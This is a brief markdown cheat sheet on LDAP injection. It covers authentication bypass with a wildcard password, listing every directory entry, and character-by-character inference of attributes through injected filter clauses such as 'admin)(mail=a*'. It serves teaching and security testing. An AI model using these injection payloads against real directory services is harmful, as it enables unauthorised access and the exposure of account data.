# LDAP Injection

## Table of Contents

- [Authentication Bypass](#authentication-bypass)
- [Data Exfiltration](#data-exfiltration)

## Authentication Bypass

### Sign-in succeeds without the correct password, because a wildcard matches any value. [^1]

- Login bypass with a wildcard password
    1. Filter that validates credentials
        ```text
        (&(uid={username})(userPassword={password}))
        ```

    2. Manipulated filter, with `*` as the password
        ```text
        (&(uid=admin)(userPassword=*))
        ```

## Data Exfiltration

### Directory entries and attributes that the page is not meant to reveal can be listed or inferred.

- Listing every entry
    1. Filter used by a directory search
        ```text
        (&(objectClass=person)(cn={name}))
        ```

    2. Manipulated filter, with `*` as the name
        ```text
        (&(objectClass=person)(cn=*))
        ```
    Every person in the directory is returned, including service and administrative accounts.

- Inferring an attribute one character at a time
    1. Filter used to check whether a user exists
        ```text
        (&(uid={username})(objectClass=person))
        ```

    2. Manipulated filter, with `admin)(mail=a*` as the username
        ```text
        (&(uid=admin)(mail=a*)(objectClass=person))
        ```
    The page reports that the user exists only when the attribute starts with the guessed prefix, so its value can be recovered by extending the prefix one character at a time.

[^1]: Applies when the service authenticates by searching the directory with its own account and treating a match as success, instead of binding with the user's credentials.
